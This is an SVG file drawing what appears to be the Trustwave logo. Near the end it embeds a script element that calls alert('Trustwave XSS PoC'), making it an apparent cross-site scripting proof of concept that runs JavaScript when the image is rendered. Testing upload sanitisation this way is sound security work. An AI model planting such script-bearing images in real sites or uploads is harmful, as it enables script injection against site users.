<svg id="svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="57.71753388718845" viewBox="0, 0, 400,57.71753388718845"><g id="svgg"><path id="path0" d="M18.000 0.144 C 18.000 0.223,18.694 0.529,19.542 0.825 C 22.291 1.783,25.357 3.052,26.314 3.630 C 26.829 3.941,27.550 4.332,27.917 4.500 C 28.838 4.923,32.374 6.965,32.489 7.141 C 32.541 7.220,33.494 7.900,34.608 8.651 C 35.722 9.402,36.884 10.258,37.191 10.553 C 37.499 10.847,38.313 11.549,39.000 12.111 C 41.477 14.137,46.102 19.142,47.750 21.578 C 48.208 22.256,48.895 23.210,49.275 23.697 C 49.656 24.185,50.174 24.958,50.427 25.417 C 51.557 27.465,52.506 29.135,52.887 29.750 C 53.398 30.572,55.227 34.848,55.701 36.328 C 55.893 36.927,56.189 37.678,56.359 37.998 C 56.528 38.317,56.667 38.673,56.667 38.789 C 56.667 38.905,56.742 39.000,56.833 39.000 C 56.943 39.000,57.000 32.389,57.000 19.500 L 57.000 0.000 37.500 0.000 C 26.672 0.000,18.000 0.064,18.000 0.144 " stroke="none" fill="#ec1c3c" fill-rule="evenodd"></path><path id="path1" d="M67.500 2.833 L 67.500 5.667 75.667 5.667 L 83.833 5.667 83.833 31.333 L 83.833 57.000 87.833 57.000 L 91.833 57.000 91.833 31.333 L 91.833 5.667 100.000 5.667 L 108.167 5.667 108.167 2.833 L 108.167 0.000 87.833 0.000 L 67.500 0.000 67.500 2.833 M0.000 24.333 C 0.000 39.699,0.052 46.000,0.179 46.000 C 0.278 46.000,1.084 45.576,1.971 45.057 C 3.560 44.128,3.849 43.946,5.949 42.542 C 6.531 42.152,7.059 41.833,7.121 41.833 C 7.333 41.833,10.333 39.789,10.333 39.645 C 10.333 39.565,10.411 39.500,10.507 39.500 C 10.702 39.500,15.325 36.415,15.583 36.112 C 15.776 35.886,17.166 34.864,18.526 33.949 C 19.044 33.600,19.719 33.073,20.026 32.778 C 20.332 32.483,20.846 32.061,21.167 31.841 C 21.790 31.413,23.540 29.956,24.500 29.067 C 24.821 28.769,25.945 27.732,26.998 26.762 C 29.203 24.731,32.018 21.750,33.776 19.583 C 34.446 18.758,35.258 17.759,35.580 17.364 C 36.337 16.435,36.325 16.369,35.276 15.618 C 34.791 15.270,34.032 14.654,33.592 14.249 C 32.544 13.287,27.860 10.171,26.117 9.276 C 20.088 6.181,15.777 4.657,10.417 3.724 C 9.500 3.565,8.712 3.381,8.666 3.316 C 8.531 3.124,3.655 2.667,1.748 2.667 L 0.000 2.667 0.000 24.333 M208.417 6.634 C 207.592 6.772,206.879 6.937,206.833 7.000 C 206.787 7.063,205.915 7.247,204.895 7.410 L 203.040 7.705 202.915 25.811 C 202.748 49.946,202.793 51.315,203.826 53.593 C 205.551 57.398,212.149 58.736,218.971 56.664 L 220.167 56.301 220.167 53.817 C 220.167 52.451,220.125 51.333,220.073 51.333 C 220.022 51.333,219.290 51.537,218.448 51.786 C 215.406 52.685,212.562 52.289,211.463 50.812 C 210.382 49.359,210.425 49.996,210.371 34.708 L 210.322 20.833 214.374 20.833 L 218.426 20.833 218.736 22.042 C 218.906 22.706,219.096 23.287,219.158 23.333 C 219.219 23.379,219.630 24.729,220.069 26.333 C 220.508 27.938,221.040 29.850,221.252 30.583 C 221.463 31.317,221.879 32.817,222.175 33.917 C 222.472 35.017,222.770 35.992,222.837 36.083 C 222.973 36.269,223.483 38.025,225.089 43.833 C 225.685 45.987,226.277 47.975,226.406 48.250 C 226.534 48.525,226.828 49.462,227.059 50.333 C 227.290 51.204,227.717 52.779,228.009 53.833 C 228.300 54.887,228.615 56.033,228.707 56.378 L 228.875 57.006 232.721 56.961 L 236.567 56.917 236.820 56.083 C 236.959 55.625,237.120 55.212,237.179 55.167 C 237.272 55.094,238.890 49.848,240.108 45.672 C 240.334 44.896,240.580 44.183,240.654 44.089 C 240.786 43.919,241.377 42.050,242.579 38.000 C 243.530 34.799,244.008 33.298,244.254 32.747 C 244.378 32.471,244.834 31.065,245.267 29.622 C 245.701 28.180,246.102 27.000,246.158 27.000 C 246.215 27.000,246.504 27.916,246.802 29.035 C 247.099 30.154,247.402 31.110,247.475 31.160 C 247.548 31.209,247.696 31.587,247.805 32.000 C 248.007 32.771,249.184 37.066,250.362 41.333 C 250.729 42.662,251.087 43.825,251.157 43.917 C 251.228 44.008,251.716 45.658,252.243 47.583 C 252.770 49.508,253.447 51.946,253.748 53.000 C 254.048 54.054,254.347 55.160,254.410 55.458 C 254.474 55.756,254.586 56.000,254.659 56.000 C 254.732 56.000,254.837 56.226,254.892 56.503 L 254.993 57.006 258.871 56.961 L 262.750 56.917 263.623 53.833 C 264.103 52.137,264.698 50.038,264.945 49.167 C 265.191 48.296,265.446 47.508,265.510 47.417 C 265.657 47.209,266.135 45.595,267.684 40.083 C 268.353 37.700,268.949 35.712,269.006 35.667 C 269.104 35.589,269.909 32.829,271.678 26.500 C 272.075 25.079,272.451 23.879,272.512 23.833 C 272.609 23.760,273.635 20.285,274.257 17.917 C 274.378 17.458,274.528 16.950,274.591 16.788 C 274.698 16.511,274.505 16.496,271.398 16.538 L 268.091 16.583 267.899 17.417 C 267.794 17.875,267.390 19.450,267.001 20.917 C 266.612 22.383,266.104 24.333,265.872 25.250 C 265.640 26.167,265.401 26.954,265.342 27.000 C 265.282 27.046,265.022 27.871,264.763 28.833 C 264.172 31.037,262.617 36.963,262.140 38.833 C 261.941 39.612,261.725 40.287,261.660 40.333 C 261.595 40.379,261.070 42.235,260.492 44.458 C 259.915 46.681,259.391 48.500,259.328 48.500 C 259.265 48.500,259.041 47.844,258.830 47.042 C 258.619 46.240,258.390 45.508,258.320 45.416 C 258.251 45.324,257.890 44.087,257.519 42.666 C 257.147 41.246,256.654 39.371,256.423 38.500 C 256.192 37.629,255.767 36.017,255.479 34.917 C 255.191 33.817,254.896 32.878,254.824 32.831 C 254.752 32.785,254.574 32.260,254.430 31.665 C 254.285 31.070,253.987 29.908,253.768 29.083 C 253.549 28.258,252.941 25.971,252.417 24.000 C 251.894 22.029,251.403 20.340,251.327 20.246 C 251.250 20.152,250.986 19.270,250.740 18.287 L 250.292 16.500 246.909 16.500 L 243.526 16.500 243.357 17.042 C 242.736 19.030,241.555 23.009,240.972 25.081 C 240.792 25.721,240.585 26.283,240.514 26.331 C 240.402 26.405,239.781 28.387,238.660 32.250 C 237.617 35.842,237.122 37.437,237.004 37.583 C 236.929 37.675,236.515 38.950,236.084 40.417 C 235.653 41.883,235.092 43.758,234.837 44.583 C 234.582 45.408,234.202 46.683,233.993 47.417 C 233.784 48.150,233.566 48.805,233.509 48.873 C 233.452 48.940,232.705 46.203,231.850 42.789 C 230.995 39.376,230.246 36.546,230.186 36.500 C 230.126 36.454,229.297 33.304,228.344 29.500 C 227.391 25.696,226.562 22.546,226.503 22.500 C 226.443 22.454,226.069 21.085,225.673 19.458 L 224.952 16.500 217.643 16.500 L 210.333 16.500 210.333 11.417 C 210.333 7.448,210.288 6.339,210.125 6.358 C 210.010 6.371,209.242 6.495,208.417 6.634 M180.417 15.666 C 177.731 15.910,174.576 16.823,173.500 17.668 C 173.271 17.848,172.692 18.295,172.214 18.663 C 171.377 19.307,170.000 20.935,170.000 21.281 C 170.000 21.374,169.852 21.620,169.671 21.828 C 168.388 23.308,167.900 28.685,168.816 31.241 C 169.404 32.880,170.716 34.525,172.578 35.953 C 173.808 36.897,176.473 37.892,180.816 39.027 C 181.513 39.209,182.308 39.461,182.583 39.585 C 182.858 39.710,183.776 40.040,184.623 40.319 C 188.877 41.719,190.412 43.422,190.401 46.730 C 190.386 51.179,187.129 53.401,181.472 52.821 C 176.893 52.350,174.500 49.798,174.500 45.382 L 174.500 44.167 170.808 44.167 L 167.117 44.167 167.228 46.042 C 167.719 54.339,172.551 57.884,183.000 57.616 C 193.293 57.351,198.457 52.480,197.495 43.945 C 196.807 37.849,193.795 35.374,183.840 32.725 C 182.966 32.493,182.213 32.253,182.167 32.193 C 182.121 32.133,181.417 31.862,180.602 31.592 C 176.819 30.338,175.078 28.543,175.091 25.907 C 175.107 22.496,178.179 20.167,182.662 20.167 C 187.186 20.167,189.990 22.985,189.999 27.542 L 190.000 28.167 193.417 28.167 L 196.833 28.167 196.830 27.208 C 196.802 19.186,190.498 14.753,180.417 15.666 M290.667 15.668 C 284.571 16.152,280.260 18.549,278.370 22.506 C 277.547 24.230,277.336 25.179,277.213 27.708 L 277.118 29.667 280.539 29.667 L 283.961 29.667 284.076 28.375 C 284.536 23.217,286.823 20.820,291.667 20.420 C 297.821 19.911,300.157 22.412,300.164 29.522 L 300.167 32.461 298.875 32.574 C 284.694 33.817,279.426 35.712,277.069 40.417 C 276.602 41.348,276.244 42.343,276.125 43.042 C 276.019 43.660,275.873 44.167,275.799 44.167 C 275.616 44.167,275.631 47.770,275.817 48.127 C 275.899 48.286,276.095 49.017,276.252 49.750 C 276.853 52.555,278.734 55.027,281.179 56.227 C 286.604 58.887,295.535 57.745,299.208 53.920 L 300.167 52.922 300.174 53.586 C 300.206 56.537,300.790 56.895,305.708 56.971 L 309.333 57.028 309.333 56.347 C 309.333 55.852,309.265 55.667,309.082 55.667 C 308.738 55.667,307.895 54.835,307.635 54.239 C 307.470 53.861,307.400 50.493,307.322 39.333 C 307.215 23.883,307.239 24.316,306.348 21.775 C 304.788 17.324,298.867 15.018,290.667 15.668 M362.333 15.684 C 359.555 15.927,356.230 16.924,355.167 17.834 C 354.846 18.109,354.344 18.447,354.052 18.586 C 353.217 18.984,351.729 20.436,350.963 21.602 C 350.578 22.187,350.204 22.667,350.133 22.667 C 349.289 22.667,347.147 29.748,346.899 33.360 C 346.837 34.262,346.721 35.000,346.643 35.000 C 346.457 35.000,346.456 40.286,346.642 40.401 C 346.720 40.449,346.832 41.126,346.892 41.905 C 347.510 49.947,351.695 55.393,358.583 57.122 C 361.377 57.823,367.338 57.815,370.083 57.107 C 374.127 56.063,376.057 54.846,378.709 51.667 C 379.853 50.294,380.824 47.377,380.830 45.292 L 380.833 44.333 377.287 44.333 L 373.740 44.333 373.532 45.708 C 372.866 50.104,369.390 52.886,364.583 52.874 C 358.040 52.856,354.772 48.504,354.385 39.292 L 354.282 36.833 367.641 36.833 L 381.000 36.833 380.999 34.125 C 380.998 29.250,380.084 24.941,378.565 22.644 C 378.163 22.036,377.833 21.464,377.833 21.373 C 377.833 21.099,375.659 18.838,375.135 18.567 C 374.868 18.429,374.505 18.172,374.329 17.996 C 373.320 16.987,369.945 15.929,366.917 15.673 C 364.709 15.486,364.601 15.486,362.333 15.684 M118.138 15.837 C 116.290 16.149,113.932 17.115,113.544 17.720 C 113.474 17.829,113.089 18.140,112.688 18.412 C 112.288 18.684,111.575 19.374,111.105 19.946 L 110.250 20.986 110.204 18.743 L 110.157 16.500 106.495 16.500 L 102.833 16.500 102.833 36.750 L 102.833 57.000 106.500 57.000 L 110.167 57.000 110.169 42.625 C 110.172 27.145,110.163 27.312,111.050 25.311 C 111.821 23.571,113.805 22.180,115.931 21.889 C 116.336 21.833,116.667 21.723,116.667 21.644 C 116.667 21.451,118.595 21.459,118.961 21.655 C 119.120 21.740,119.725 21.901,120.304 22.013 C 120.897 22.128,122.056 22.571,122.950 23.025 C 123.826 23.470,124.571 23.833,124.608 23.833 C 124.644 23.833,124.653 22.315,124.628 20.458 L 124.583 17.083 123.499 16.552 C 121.902 15.769,120.025 15.519,118.138 15.837 M392.226 15.996 C 387.080 17.093,385.711 24.325,390.080 27.331 C 393.495 29.681,398.311 28.224,399.626 24.443 C 401.351 19.481,397.342 14.905,392.226 15.996 M130.167 31.645 C 130.167 46.950,130.257 49.465,130.818 49.828 C 130.894 49.877,131.076 50.333,131.223 50.841 C 132.493 55.242,136.398 57.575,142.500 57.579 C 147.516 57.582,151.194 56.354,154.350 53.622 L 155.667 52.482 155.667 54.741 L 155.667 57.000 159.167 57.000 L 162.667 57.000 162.667 36.750 L 162.667 16.500 159.167 16.500 L 155.667 16.500 155.667 30.919 C 155.667 38.914,155.601 45.467,155.520 45.627 C 155.439 45.786,155.285 46.292,155.177 46.750 C 154.094 51.353,147.547 54.151,142.100 52.339 C 140.571 51.830,139.553 50.877,138.760 49.213 C 138.421 48.500,138.066 47.775,137.972 47.602 C 137.421 46.586,137.339 44.362,137.336 30.375 L 137.333 16.500 133.750 16.500 L 130.167 16.500 130.167 31.645 M310.500 16.718 C 310.500 16.994,311.172 19.028,311.337 19.250 C 311.405 19.342,312.196 21.742,313.095 24.583 C 313.993 27.425,314.772 29.787,314.825 29.833 C 314.879 29.879,315.622 32.129,316.477 34.833 C 317.333 37.537,318.166 40.050,318.329 40.417 C 318.598 41.021,319.547 43.958,320.994 48.667 C 321.290 49.629,321.644 50.658,321.782 50.952 C 321.919 51.246,322.422 52.709,322.898 54.202 L 323.764 56.917 327.604 56.961 L 331.444 57.006 332.001 55.378 C 332.307 54.483,332.610 53.712,332.675 53.667 C 332.739 53.621,333.521 51.483,334.412 48.917 C 335.304 46.350,336.187 43.913,336.375 43.500 C 336.684 42.821,337.855 39.545,339.204 35.583 C 339.485 34.758,339.763 34.046,339.823 34.000 C 339.921 33.924,340.419 32.553,342.336 27.083 C 342.689 26.075,343.031 25.063,343.095 24.833 C 343.159 24.604,343.270 24.379,343.341 24.333 C 343.523 24.214,346.000 17.139,346.000 16.737 C 346.000 16.540,345.444 16.500,342.701 16.500 L 339.403 16.500 337.755 21.542 C 336.848 24.315,336.055 26.621,335.993 26.667 C 335.931 26.712,335.141 29.000,334.238 31.750 C 333.335 34.500,332.547 36.787,332.488 36.833 C 332.429 36.879,331.640 39.167,330.736 41.917 C 329.832 44.667,329.045 46.954,328.987 47.000 C 328.930 47.046,328.748 47.490,328.585 47.988 L 328.287 48.893 327.992 47.905 C 327.831 47.361,327.270 45.454,326.748 43.667 C 326.225 41.879,325.741 40.342,325.673 40.250 C 325.604 40.158,325.267 39.108,324.922 37.917 C 324.577 36.725,324.048 34.925,323.746 33.917 C 323.443 32.908,322.991 31.352,322.742 30.458 C 322.492 29.565,322.223 28.833,322.144 28.833 C 322.065 28.833,322.000 28.741,322.000 28.628 C 322.000 28.167,318.965 17.944,318.561 17.042 L 318.318 16.500 314.409 16.500 C 311.304 16.500,310.500 16.545,310.500 16.718 M395.858 17.247 C 399.475 18.717,400.126 24.178,396.955 26.454 C 394.802 28.001,391.971 27.788,390.089 25.939 C 385.884 21.805,390.385 15.023,395.858 17.247 M391.167 22.167 L 391.167 26.000 391.917 26.000 L 392.667 26.000 392.667 24.394 L 392.667 22.788 393.442 22.894 C 394.587 23.051,394.739 23.276,395.239 25.542 C 395.335 25.979,395.385 26.000,396.337 26.000 C 397.245 26.000,397.578 25.838,397.178 25.590 C 397.093 25.538,396.931 25.083,396.818 24.580 C 396.706 24.078,396.551 23.667,396.473 23.667 C 396.396 23.667,396.333 23.533,396.333 23.370 C 396.333 23.207,396.213 22.903,396.067 22.694 C 395.798 22.309,395.964 21.909,396.574 21.470 C 396.661 21.408,396.736 20.958,396.741 20.470 C 396.758 18.800,395.935 18.336,392.958 18.334 L 391.167 18.333 391.167 22.167 M394.630 19.759 C 395.367 20.276,395.088 21.402,394.156 21.670 C 392.797 22.060,392.667 21.972,392.667 20.667 L 392.667 19.500 393.463 19.500 C 393.914 19.500,394.420 19.613,394.630 19.759 M366.790 20.597 C 370.889 21.444,373.321 25.032,373.772 30.898 L 373.883 32.333 364.202 32.333 L 354.521 32.333 354.603 31.708 C 355.248 26.772,356.495 24.230,359.250 22.233 C 359.617 21.967,360.009 21.663,360.122 21.556 C 361.073 20.660,364.624 20.150,366.790 20.597 M39.500 21.347 C 39.179 21.625,38.345 22.292,37.646 22.828 C 34.704 25.087,29.525 30.262,26.370 34.095 C 25.621 35.005,24.612 36.224,24.129 36.802 C 23.645 37.381,22.792 38.527,22.232 39.350 C 21.672 40.172,21.100 40.936,20.960 41.047 C 20.713 41.243,19.500 42.923,19.500 43.068 C 19.500 43.156,17.641 45.884,17.501 46.000 C 17.314 46.157,14.912 49.916,14.719 50.354 C 14.613 50.595,14.309 51.045,14.044 51.354 C 13.603 51.869,12.500 53.575,12.500 53.742 C 12.500 53.781,12.125 54.437,11.667 55.198 C 11.209 55.960,10.834 56.677,10.834 56.792 C 10.833 56.957,15.294 57.000,32.583 57.000 C 53.187 57.000,54.333 56.985,54.331 56.708 C 54.307 53.715,53.538 46.537,53.169 45.864 C 53.084 45.710,52.857 44.871,52.664 44.000 C 51.970 40.866,49.940 34.810,49.477 34.494 C 49.405 34.445,49.151 33.958,48.913 33.411 C 48.168 31.705,46.314 28.268,45.995 28.000 C 45.940 27.954,45.308 27.023,44.590 25.930 C 43.871 24.837,42.900 23.525,42.431 23.013 C 41.961 22.502,41.364 21.802,41.102 21.458 C 40.530 20.705,40.263 20.687,39.500 21.347 M300.167 40.652 C 300.167 46.131,299.860 47.605,298.296 49.632 C 295.229 53.607,286.867 53.935,284.669 50.167 C 281.948 45.503,283.895 40.269,288.974 38.597 C 291.035 37.918,297.525 36.753,299.625 36.684 L 300.167 36.667 300.167 40.652 " stroke="none" fill="#040404" fill-rule="evenodd"></path>
<script type="text/javascript">
    alert("Trustwave XSS PoC")
  </script>
</g></svg>